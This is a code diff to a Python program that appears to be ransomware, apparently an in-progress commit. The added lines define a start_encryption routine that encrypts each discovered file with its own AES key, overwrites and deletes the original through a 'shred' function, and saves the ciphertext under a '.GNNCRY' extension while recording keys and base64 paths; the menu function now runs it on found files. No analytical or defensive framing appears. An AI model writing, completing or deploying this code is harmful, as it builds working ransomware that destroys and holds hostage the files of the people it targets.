@@ -48,16 +48,12 @@ def get_paths():
         content = f.read().split("\n")
     
     for aes_and_path in content:
-        encrypted_files_path.append(base64.b64decode(aes_and_path[1]))
+        encrypted_files_path.append(aes_and_path[1])
     
     return encrypted_files_path
 
 
 def open_decryptor():
-    pass
-
-
-def encrypt_new_files():
     pass
 
 
@@ -92,9 +88,56 @@ for (i=0;i<Desktops.length;i++) {
     os.system(kde)
 
 
+def shred(file_name,  passes=1):
+
+    def generate_data(length):
+        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
+        return ''.join(random.SystemRandom().choice(chars) for _ in range(length))
+
+    if not os.path.isfile(file_name):
+        print(file_name + " is not a file.")
+        return False
+
+    ld = os.path.getsize(file_name)
+    fh = open(file_name,  "w")
+    for _ in range(int(passes)):
+        data = generate_data(ld)
+        fh.write(data)
+        fh.seek(0,  0)
+
+    fh.close()
+    os.remove(file_name)
+
+
+def start_encryption(files):
+    AES_and_base64_path = []
+    for found_file in files:
+        key = generate_keys.generate_key(32, True)
+        AES_obj = symmetric.AESCipher(key)
+        
+        found_file = base64.b64decode(found_file)
+        with open(found_file, 'rb') as f:
+            file_content = f.read()
+        
+        encrypted = AES_obj.encrypt(file_content)
+        shred(found_file)
+
+        new_file_name = found_file + ".GNNCRY"
+        with open(new_file_name, 'wb') as f:
+            f.write(encrypted)
+
+        base64_new_file_name = base64.b64encode(new_file_name)
+
+        # list of tuples of AES_key and base64(path)
+        AES_and_base64_path.append((key, base64_new_file_name))
+    
+    return AES_and_base64_path
+
+
 def menu():
     encrypted_files = get_paths()
     new_files = get_files.find_files(test_path)
+    aes_keys_and_base64_path = start_encryption(new_files)
     
 
 
